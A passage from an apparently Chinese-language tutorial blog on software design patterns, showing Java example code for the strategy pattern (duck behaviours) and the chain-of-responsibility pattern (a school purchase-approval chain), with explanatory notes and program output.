class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">FlyBehavior</span> &#123;<br>   <br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span>; <span class="hljs-comment">// 子类具体实现</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>GoodFlyBehavior.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GoodFlyBehavior</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FlyBehavior</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 飞翔技术高超 ~~~&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>NoFlyBehavior.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NoFlyBehavior</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FlyBehavior</span>&#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 不会飞翔  &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>PekingDuck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PekingDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span> &#123;<br><br>   <br>   <span class="hljs-comment">//假如北京鸭可以飞翔，但是飞翔技术一般</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">PekingDuck</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      flyBehavior = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadFlyBehavior</span>();<br>      <br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.print(<span class="hljs-string">&quot;北京鸭=&gt;&quot;</span>);<br>   &#125;<br>   <br>   <br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>QuackBehavior.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">QuackBehavior</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span>;<span class="hljs-comment">//子类实现</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ToyDuck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToyDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span>&#123;<br><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ToyDuck</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      flyBehavior = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoFlyBehavior</span>();<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;玩具鸭=&gt;&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">//需要重写父类的所有方法</span><br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;玩具鸭不能叫~~&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swim</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;玩具鸭不会游泳~~&quot;</span>);<br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>WildDuck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WildDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span> &#123;<br><br>   <br>   <span class="hljs-comment">//构造器，传入FlyBehavor 的对象</span><br>   <span class="hljs-keyword">public</span>  <span class="hljs-title function_">WildDuck</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      flyBehavior = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GoodFlyBehavior</span>();<br>   &#125;<br>   <br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 野鸭=&gt; &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs coq"> 野鸭=&gt; <br> 飞翔技术高超 ~~~<br>玩具鸭=&gt;<br> 不会飞翔  <br>北京鸭=&gt; 飞翔技术一般 <br>北京鸭的实际飞翔能力<br>北京鸭=&gt; 不会飞翔 <br></code></pre></td></tr></table></figure><h2 id="策略模式的注意事项和细节"><a class="markdownIt-Anchor" href="#策略模式的注意事项和细节"></a> 策略模式的注意事项和细节</h2><ol><li><p>策略模式的关键是：分析项目中变化部分与不变部分</p></li><li><p>策略模式的核心思想是：多用组合/聚合 少用继承；用行为类组合，而不是行为的继承。更有弹性</p></li><li><p>体现了“对修改关闭，对扩展开放”原则，客户端增加行为不用修改原有代码，只要添加一种策略（或者行为）即可，避免了使用多重转移语句（if…else if…else）</p></li><li><p>提供了可以替换继承关系的办法： 策略模式将算法封装在独立的 Strategy 类中使得你可以独立于其 Context 改变它，使它易于切换、易于理解、易于扩展</p></li><li><p><strong>需要注意的是</strong>：每添加一个策略就要增加一个类，当策略过多是会导致类数目庞</p></li></ol><h1 id="责任链模式"><a class="markdownIt-Anchor" href="#责任链模式"></a> <mark>责任链模式</mark></h1><p>顾名思义，责任链模式（Chain of Responsibility Pattern）为请求创建了一个接收者对象的链。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。这种类型的设计模式属于行为型模式。</p><p>在这种模式中，通常每个接收者都包含对另一个接收者的引用。如果一个对象不能处理该请求，那么它会把相同的请求传给下一个接收者，依此类推。</p><h2 id="介绍-22"><a class="markdownIt-Anchor" href="#介绍-22"></a> 介绍</h2><p><strong>意图：</strong> 避免请求发送者与接收者耦合在一起，让多个对象都有可能接收请求，将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。</p><p><strong>主要解决：</strong><br />职责链上的处理者负责处理请求，客户只需要将请求发送到职责链上即可，无须关心请求的处理细节和请求的传递，所以职责链将请求的发送者和请求的处理者解耦了。</p><p><strong>何时使用：</strong> 在处理消息的时候以过滤很多道。</p><p><strong>如何解决：</strong> 拦截的类都实现统一接口。</p><p><strong>关键代码：</strong> Handler 里面聚合它自己，在 HandlerRequest 里判断是否合适，如果没达到条件则向下传递，向谁传递之前 set 进去。</p><p><strong>应用实例：</strong> 1、红楼梦中的&quot;击鼓传花&quot;。 2、JS 中的事件冒泡。 3、JAVA WEB 中 Apache Tomcat 对 Encoding 的处理，Struts2 的拦截器，jsp servlet 的 Filter。</p><p><strong>优点：</strong> 1、降低耦合度。它将请求的发送者和接收者解耦。 2、简化了对象。使得对象不需要知道链的结构。3、增强给对象指派职责的灵活性。通过改变链内的成员或者调动它们的次序，允许动态地新增或者删除责任。 4、增加新的请求处理类很方便。</p><p><strong>缺点：</strong> 1、不能保证请求一定被接收。 2、系统性能将受到一定影响，而且在进行代码调试时不太方便，可能会造成循环调用。<br />3、可能不容易观察运行时的特征，有碍于除错。</p><p><strong>使用场景：</strong> 1、有多个对象可以处理同一个请求，具体哪个对象处理该请求由运行时刻自动确定。<br />2、在不明确指定接收者的情况下，向多个对象中的一个提交一个请求。 3、可动态指定一组对象处理请求。</p><p><strong>注意事项：</strong> 在 JAVA WEB 中遇到很多应用。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105183130277.png" alt="image-20230105183130277" /></p><p>对原理类图的说明-即(职责链模式的角色及职责)</p><ol><li><p>Handler : 抽象的处理者, 定义了一个处理请求的接口, 同时含义另外 Handler</p></li><li><p>ConcreteHandlerA , B 是具体的处理者, 处理它自己负责的请求， 可以访问它的后继者(即下一个处理者), 如果可以处理当前请求，则处理，否则就将该请求交个 后继者去处理，从而形成一个职责链</p></li><li><p>Request ， 含义很多属性，表示一个请求</p></li></ol><h2 id="实现-20"><a class="markdownIt-Anchor" href="#实现-20"></a> 实现</h2><ol><li>应用实例要求</li></ol><p>编写程序完成学校 OA 系统的采购审批项目：需求</p><p>采购员采购教学器材</p><p>如果金额 小于等于 5000, 由教学主任审批</p><p>如果金额 小于等于 10000, 由院长审批</p><p>如果金额 小于等于 30000, 由副校长审批</p><p>如果金额 超过 30000 以上，有校长审批</p><ol start="2"><li>思路分析和图解(类图)</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105184409277.png" alt="image-20230105184409277" /></p><p><code>Approver.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Approver</span> &#123;<br><br>    Approver approver;  <span class="hljs-comment">//下一个处理者</span><br>    String name; <span class="hljs-comment">// 名字</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Approver</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-comment">//下一个处理者</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApprover</span><span class="hljs-params">(Approver approver)</span> &#123;<br>        <span class="hljs-built_in">this</span>.approver = approver;<br>    &#125;<br><br>    <span class="hljs-comment">//处理审批请求的方法，得到一个请求, 处理是子类完成，因此该方法做成抽象</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processRequest</span><span class="hljs-params">(PurchaseRequest purchaseRequest)</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//创建一个请求</span><br>      <span class="hljs-type">PurchaseRequest</span> <span class="hljs-variable">purchaseRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PurchaseRequest</span>(<span class="hljs-number">1</span>, <span class="hljs-number">31000</span>, <span class="hljs-number">1</span>);<br>      <br>      <span class="hljs-comment">//创建相关的审批人</span><br>      <span class="hljs-type">DepartmentApprover</span> <span class="hljs-variable">departmentApprover</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DepartmentApprover</span>(<span class="hljs-string">&quot;张主任&quot;</span>);<br>      <span class="hljs-type">CollegeApprover</span> <span class="hljs-variable">collegeApprover</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CollegeApprover</span>(<span class="hljs-string">&quot;李院长&quot;</span>);<br>      <span class="hljs-type">ViceSchoolMasterApprover</span> <span class="hljs-variable">viceSchoolMasterApprover</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ViceSchoolMasterApprover</span>(<span class="hljs-string">&quot;王副校&quot;</span>);<br>      <span class="hljs-type">SchoolMasterApprover</span> <span class="hljs-variable">schoolMasterApprover</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SchoolMasterApprover</span>(<span class="hljs-string">&quot;佟校长&quot;</span>);<br>   <br>   <br>      <span class="hljs-comment">//需要将各个审批级别的下一个设置好 (处理人构成环形: )</span><br>      departmentApprover.setApprover(collegeApprover);<br>      collegeApprover.setApprover(viceSchoolMasterApprover);<br>      viceSchoolMasterApprover.setApprover(schoolMasterApprover);<br>      schoolMasterApprover.setApprover(departmentApprover);<br>      <br><br>      departmentApprover.processRequest(purchaseRequest);<br>      viceSchoolMasterApprover.processRequest(purchaseRequest);<br><br>      <span class="hljs-comment">//创建一个请求</span><br>      <span class="hljs-type">PurchaseRequest</span> <span class="hljs-variable">purchaseRequest1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PurchaseRequest</span>(<span class="hljs-number">2</span>, <span class="hljs-number">10000</span>, <span class="hljs-number">2</span>);<br><br><br>      departmentApprover.processRequest(purchaseRequest1);<br>      viceSchoolMasterApprover.processRequest(purchaseRequest1);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>CollegeApprover.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 院长</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CollegeApprover</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Approver</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">CollegeApprover</span><span class="hljs-params">(String name)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      <span class="hljs-built_in">super</span>(name);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processRequest</span><span class="hljs-params">(PurchaseRequest purchaseRequest)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">if</span>(purchaseRequest.getPrice() &gt; <span class="hljs-number">5000</span> &amp;&amp; purchaseRequest.getPrice() &lt;= <span class="hljs-number">10000</span>) &#123;<br>         System.out.println(<span class="hljs-string">&quot; 请求编号 id= &quot;</span> + purchaseRequest.getId() + <span class="hljs-string">&quot; 被 &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; 处理&quot;</span>);<br>      &#125;<span class="hljs-keyword">else</span> &#123;<br>         approver.processRequest(purchaseRequest);<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>DepartmentApprover.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 主任</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DepartmentApprover</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Approver</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DepartmentApprover</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>        <span class="hljs-built_in">super</span>(name);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processRequest</span><span class="hljs-params">(PurchaseRequest purchaseRequest)</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-keyword">if</span> (purchaseRequest.getPrice() &lt;= <span class="hljs-number">5000</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot; 请求编号 id= &quot;</span> + purchaseRequest.getId() + <span class="hljs-string">&quot; 被 &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; 处理&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            approver.processRequest(purchaseRequest);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>PurchaseRequest.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><br><span class="hljs-comment">//请求类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PurchaseRequest</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//请求类型</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> <span class="hljs-variable">price</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.0f</span>; <span class="hljs-comment">//请求金额</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>   <span class="hljs-comment">//构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">PurchaseRequest</span><span class="hljs-params">(<span class="hljs-type">int</span> type, <span class="hljs-type">float</span> price, <span class="hljs-type">int</span> id)</span> &#123;<br>      <span class="hljs-built_in">this</span>.type = type;<br>      <span class="hljs-built_in">this</span>.price = price;<br>      <span class="hljs-built_in">this</span>.id = id;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> type;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> price;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> id;<br>   &#125;<br>   <br>   <br>   <br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>SchoolMasterApprover.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 校长</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SchoolMasterApprover</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Approver</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">SchoolMasterApprover</span><span class="hljs-params">(String name)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      <span class="hljs-built_in">super</span>(name);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processRequest</span><span class="hljs-params">(PurchaseRequest purchaseRequest)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">if</span>(purchaseRequest.getPrice() &gt; <span class="hljs-number">30000</span>) &#123;<br>         System.out.println(<span class="hljs-string">&quot; 请求编号 id= &quot;</span> + purchaseRequest.getId() + <span class="hljs-string">&quot; 被 &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; 处理&quot;</span>);<br>      &#125;<span class="hljs-keyword">else</span> &#123;<br>         approver.processRequest(purchaseRequest);<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ViceSchoolMasterApprover.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 副校</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ViceSchoolMasterApprover</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Approver</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ViceSchoolMasterApprover</span><span class="hljs-params">(String name)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      <span class="hljs-built_in">super</span>(name);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processRequest</span><span class="hljs-params">(PurchaseRequest purchaseRequest)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">if</span>(purchaseRequest.getPrice() &gt; <span class="hljs-number">10000</span> &amp;&amp; purchaseRequest.getPrice() &lt;= <span class="hljs-number">30000</span>) 